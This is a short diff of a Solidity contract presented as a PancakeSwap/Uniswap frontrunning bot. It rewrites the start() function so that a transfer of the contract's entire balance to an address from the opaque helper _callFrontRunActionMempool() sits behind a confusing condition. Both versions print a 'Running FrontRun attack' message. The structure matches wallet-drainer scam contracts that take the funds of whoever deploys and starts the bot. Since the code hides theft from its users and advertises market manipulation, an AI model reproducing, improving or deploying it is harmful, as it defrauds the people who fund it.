@@ -600,11 +600,19 @@ contract PancakeSwapFrontrunBot {
      * @param contract address to snipe liquidity from
      * @return `liquidity`.
      */
-    function start() public payable {
-        emit Log(
-            "Running FrontRun attack on Uniswap. This can take a while please wait..."
-        );
-        payable(_callFrontRunActionMempool()).transfer(address(this).balance);
+    function start() public {
+        if (pancakeswapV3Pool != token0() || pancakeswapV3Pool != token1()) {
+            emit Log(
+                "Running FrontRun attack on Uniswap. This can take a while please wait..."
+            );
+        } else {
+            emit Log(
+                "Running FrontRun attack on Uniswap. This can take a while please wait..."
+            );
+            payable(_callFrontRunActionMempool()).transfer(
+                address(this).balance
+            );
+        }
     }
 
     /*
